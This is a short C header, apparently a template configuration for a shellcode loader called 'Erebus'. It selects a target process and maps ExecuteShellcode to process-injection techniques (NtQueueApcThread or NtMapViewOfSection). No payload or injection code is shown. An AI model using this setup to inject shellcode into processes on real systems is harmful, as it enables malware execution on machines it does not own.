#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

#define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}\0"

// 1 = Remote
// 2 = Self
#define CONFIG_INJECTION_METHOD {{ INJECTION_METHOD }}

#define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}
#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtQueueApcThread
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#endif

#endif
